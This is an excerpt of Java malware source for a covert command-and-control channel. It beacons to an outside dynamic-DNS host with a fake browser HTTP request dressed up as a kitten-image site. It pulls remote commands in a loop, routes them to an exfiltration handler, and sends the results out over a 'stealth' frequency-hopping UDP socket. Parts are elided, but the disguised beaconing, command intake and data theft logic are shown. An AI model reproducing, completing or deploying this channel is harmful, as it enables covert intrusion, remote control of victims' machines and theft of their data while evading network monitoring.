...
import exfilfunctions.ExfilCommandHandler;
...
public class CommandChannel implements Runnable{
	...
	char[] httpSendPack = "GET / HTTP/1.1\r\nHost: thecutestkittens.sytes.net/images/cutekittens\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\r\nDNT: 1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n".toCharArray();
	ExfilCommandHandler ech;
	MultiserviceStealthUDPSocket msus;
	public CommandChannel(String ip, MultiserviceStealthUDPSocket msus) throws IOException {
		this.ip = ip;
		ech = new ExfilCommandHandler();
		this.msus = msus;
	}
	@Override
	public void run() {
			try {
				while(true){
					...
					while(!command.contentEquals("exit")) {
						command = "";
						s.getOutputStream().write(new String(httpSendPack).getBytes());
						s.getOutputStream().flush();
						String inStr = decodeResponse(readAll(s));
						while(!inStr.equals(new String(new char[] {0,0,0}))){
							s.getOutputStream().write(new String(httpSendPack).getBytes());
							s.getOutputStream().flush();
							command += inStr;
						...
						if(ech.checkExfil(command)){
							...
							try{
								...
								if(!System.getProperty("os.name").contains("Windows")){
									...
									msus.sendHoppingStealthMessage(output.getBytes(), 50);
								}else{
